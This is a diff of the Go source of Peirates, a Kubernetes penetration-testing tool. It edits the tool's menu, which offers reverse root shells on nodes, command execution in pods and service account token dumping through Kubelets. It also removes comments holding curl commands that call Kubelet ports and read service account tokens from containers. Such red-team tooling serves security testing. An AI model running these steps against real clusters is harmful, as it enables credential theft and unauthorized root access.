@@ -1057,28 +1057,28 @@ Steal Service Accounts   |
 -----------+
 Compromise |
 -----------+
-[20] Gain a reverse rootshell by launching a hostPath / pod
-[21] Run command in one or all pods in this namespace
-[22] Request all Kubelets run a token-dumping command in all pods
+[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod
+[21] Run command in one or all pods in this namespace via the API Server (RBAC permitting)
+[22] Run a token-dumping command in all pods via Kubelets (authorization/Webhook permitting)
+
 
 [exit] Exit Peirates 
 ----------------------------------------------------------------
 Peirates:># `)
 
-		bannerItemsRemoved := (`
-		
-		[23] Run a command on a pod from the Kubelet
+		// [23] Run a command in a pod via its node's Kubelet (authorization/Webhook permitting)
 
-		[7] Get a list of roles for this service account [not yet implemented]
-[8] Get a list of roles available on the cluster [implemented but not connected to menu]
-[9] Get a list of abilities for a role [not yet implemented]
-[12] Request list of pods from a Kubelet [not yet implemented]
-[16] Pull Kubernetes service account tokens from S3 [AWS only] [not yet implemented]
-[98] Shell out to bash (not yet implemented)
-[99] Build YAML Files (not yet implemented)
+		// Banner items to implement
 
-		`)
-		bannerItemsRemoved = bannerItemsRemoved + " "
+		// Run a command on a pod from the Kubelet
+		//
+		// Get a list of roles for this service account [not yet implemented]
+		// Get a list of roles available on the cluster [implemented but not connected to menu]
+		// Get a list of abilities for a role [not yet implemented]
+		// Request list of pods from a Kubelet [not yet implemented]
+		// Pull Kubernetes service account tokens from S3 [AWS only] [not yet implemented]
+		// Shell out to bash (not yet implemented)
+		// Build YAML Files (not yet implemented)
 
 		var input string
 		var userResponse string
@@ -1159,7 +1159,6 @@ Peirates:># `)
 				}
 			}
 
-			// Menu goes here
 		// [2] List namespaces or change namespace
 		case "2":
 			println("\n[1] List namespaces]\n[2] Switch namespace\n[3] List namespaces then switch namespaces")
@@ -1207,7 +1206,6 @@ Peirates:># `)
 			var secretName string
 			fmt.Scanln(&secretName)
 
-			// BUG: Temporarily we're using we're kludgy YAML parsing.
 			if !kubectlAuthCanI(connectionString, "get", "secret") {
 				println("Permission Denied: your service account isn't allowed to get secrets")
 				break
@@ -1575,20 +1573,9 @@ Peirates:># `)
 				}
 
 			}
-		// [22] Get a list of pods from the Kubelet [not yet implemented]
+		// [22] Use the kubelet to gain the token in every pod where we can run a command
 		case "22":
-			// Use kubectl get nodes to get a list of nodes
-			// ---->  GetNodesInfo(connectionString)
-			// Use kubectl get node _name_ -o yaml to get IP addresses
 			ExecuteCodeOnKubelet(connectionString, &serviceAccounts)
-			// Find a line that matches - address: IP
-			// curl port 10255 to get pods: curl -sk http://10.23.58.41:10255/pods
-
-			// FAITH working here: Parse the Json to get pod and container names
-
-			// curl port 10250 to run commands:
-			// curl -sk https://10.23.58.41:10250/run/namespace/pod/container/ \
-			// -d "cmd=cat /run/secrets/kubernetes.io/serviceaccount/token"
 		case "98":
 			break
 		case "99":
